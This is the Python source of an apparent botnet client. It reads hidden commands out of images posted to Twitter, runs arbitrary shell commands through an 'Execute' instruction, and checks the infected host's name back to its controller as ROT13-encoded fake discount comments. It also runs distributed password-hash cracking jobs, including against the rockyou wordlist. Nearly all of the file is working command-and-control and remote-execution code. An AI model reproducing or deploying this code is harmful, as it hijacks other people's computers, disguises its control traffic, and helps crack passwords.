import requests
import streamer_bot
from threading import Thread
import time
import os
import utility
import random
import calculation_handler
import codecs

CONFIRMED = False
CALCULATING = False
REPLY = False
PC_NAME = os.environ['COMPUTERNAME']


def handle_media():
    """
    Method to retrieve the hidden message from the tweet media.
    """

    print('Started')

    while True:
        if os.path.exists('Support/tweets.txt'):
            print('Found the post')
            file = open('Support/tweets.txt', 'r')
            if file.mode == 'r':
                # Reading from txt file with the media url
                img_url = file.read()
                print('Downloading from: ' + img_url)

                file = requests.get(img_url)

                try:
                    file.raise_for_status()
                except Exception as exc:
                    print('There was a problem: %s' % exc)

                # Create temporary image file
                play_file = open('Support/img.png', 'wb')
                for chunk in file.iter_content(100000):
                    play_file.write(chunk)
                play_file.close()

                print('Created img.png')
                print('Inspecting image')
                # Extract message from image
                extracted_data = utility.retrieve('Support/img.png')
                print('Intercepted: ' + extracted_data)

                # Cleaning up
                os.remove('Support/tweets.txt')
                os.remove('Support/img.png')
                handle_request(extracted_data)
        time.sleep(5)


def handle_data(extracted_data):
    """
    Method that looks at the data received from the server via the image.
    Checks if the command is directed towards this PC
    """

    if extracted_data == 'Confirm':
        return 'Confirm'
    elif extracted_data == 'HashFound':
        return 'HashFound'
    elif extracted_data == 'Noise':
        return 'Noise'

    split_data = extracted_data.split(' *** ')

    for command in split_data:
        bot_addressed = command.split(' ')[0]

        # If the bot addressed in the given command is this one - follow commands
        if bot_addressed == PC_NAME:
            raw_data = command.split(' ')[1]
            return raw_data
    return 'BadBot'


def handle_request(extracted_data):
    """
    Method that checks by which command to act.
    List of available commands: Execute - executes the command on the target machine. Echo - posts the given message
    as a comment on the post. Confirm - used to confirm if the computer has initiated the connection and is listening.
    Calculate -
    """

    global CONFIRMED
    print('Handling request')

    extracted_data = handle_data(extracted_data)

    # If command isn't for this bot let him ignore it
    if extracted_data == 'BadBot':
        print('Data wasn\'t addressed to this bot')
        return

    if extracted_data == 'Confirm':
        if not CONFIRMED:
            streamer_bot.HandlePost.post_comment(streamer_bot.HandlePost.recent_post_id, get_discount_post())
            # V Use for when the server is kept running
            # CONFIRMED = True
            return

    elif extracted_data == 'HashFound':
        calculation_handler.HASH_FOUND = True
        print('Hash found')
        time.sleep(5)
        return

    elif extracted_data == 'Noise':
        print('Server posted noise')
        return

    extracted_data = extracted_data.split('#')
    # print(extracted_data[0])

    if extracted_data[0] == 'Execute':
        os.system(extracted_data[1])
    elif extracted_data[0] == 'Echo':
        streamer_bot.HandlePost.post_comment(streamer_bot.HandlePost.recent_post_id, extracted_data[1])

    # Calculate#HASH#RANGE#LENGTH
    elif extracted_data[0] == 'Calculate':
        # if not CALCULATING:
        # If not already calculating
        calculation_handler.HASH_FOUND = False
        print(extracted_data)
        calc_thread = Thread(name='calculations', target=calculation_handler.calculation_manager,
                             args=(extracted_data[2], extracted_data[1], extracted_data[3], extracted_data[4],
                                   streamer_bot.HandlePost.recent_post_id))
        calc_thread.start()

    # Rockyou#HASH#FROM(LINE NUM)#TO(LINE NUM)
    elif extracted_data[0] == 'Rockyou':
        calc_thread = Thread(name='calculations', target=calculation_handler.calculation_manager,
                             args=(extracted_data[2], extracted_data[1], extracted_data[3], extracted_data[4],
                                   streamer_bot.HandlePost.recent_post_id))
        calc_thread.start()

    else:
        streamer_bot.HandlePost.post_comment(streamer_bot.HandlePost.recent_post_id, 'I don\'t understand')


def get_discount_post():
    links = ['https://www.amazon.com/', 'https://www.ebay.com/', 'https://store.playstation.com/',
             'https://aliexpress.com/', 'https://www.asos.com/', 'https://wish.com/']

    # Encode the host name with ROT13
    encoder = codecs.getencoder('rot-13')
    hostname = encoder(str(os.environ['COMPUTERNAME']))[0]

    return 'I have a discount for you: ' + hostname +\
           ' ----> redeem now at: ' + links[random.randint(0, len(links)-1)] + ' for a 10% discount on your next purchase!'


def main():
    if os.path.exists('Support/tweets.txt'):
        os.remove('Support/tweets.txt')

    if os.path.exists('Support/img.png'):
        os.remove('Support/img.png')

    stream_thread = Thread(target=streamer_bot.TwitterStreamer.stream)
    stream_thread.start()

    download_thread = Thread(target=handle_media)
    download_thread.start()

    stream_thread.join()
    download_thread.join()


if __name__ == '__main__':
    main()

#    Calculate#
